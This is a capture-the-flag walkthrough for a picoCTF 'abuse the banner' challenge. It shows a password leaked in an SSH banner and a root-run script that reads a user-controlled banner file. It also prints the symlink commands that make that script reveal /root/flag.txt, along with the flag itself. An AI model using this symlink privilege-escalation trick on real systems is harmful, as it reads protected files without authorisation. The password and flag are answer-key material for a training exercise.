PROBLEM STATEMENT : Can you abuse the banner?
The server has been leaking some crucial information on tethys.picoctf.net 55990. Use the leaked information to get to the server.
To connect to the running application use nc tethys.picoctf.net 49297. From the above information abuse the machine and find the flag in the /root directory.

nc tethys.picoctf.net 55990 : To get some information to get into the next server as it's leaking some information.
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

Here's are password. Now its time to enter the next server.

nc tethys.picoctf.net 49297 :
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Thomas Draper

After entering the answers, we have a new shell!

The first and the most common thing is to ls and so we did and got 2 files named banner and text.
We then read both the files using cat command.

player@challenge:~$ cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
keep digging

Now what to do?
As the question says, "find the flag in the /root directory" so we do

player@challenge:~$ ls /root
flag.txt  script.py
player@challenge:~$ cat /root/flag.txt
cat: flag.txt: Permission denied

Now what to do? Let's try reading the .py file
player@challenge:~$ cat /root/script.py
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

We can see that it has something to do with start of this shell and it is reading the file /home/player/banner which has the welcome message as we saw by catting the file, banner.

Now we see at the first hint which says "Do you know about symlinks?". I searched about it and found that Symlinks act as reference pointers to files or directories. In simple words, if
you'll call file1 symlimked to file2, you are actually calling file2.

So we create a symlink to flag.txt file through file banner using ln -s command. Before that we have to remove the banner file.
player@challenge:~$ rm banner
player@challenge:~$ ln -s /root/flag.txt banner

After this, I tried to read the banner file and also running the script.py file but nothing worked. As we are not the root we are unable to connect to flag.txt.
When you ran the script(or read the banner), you ran it with your user (“player”), who doesn’t have access to flag.txt. So when the script tried to open it using the link made, it couldn't.
Therefore, it displayed the default banner message.
Well the only other time we’ve seen the script being run is when we connected to the address with Netcat, maybe it was run as root!

So we reconnected and got the flag:
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

Do not copy the flag, they are different for different instances :)
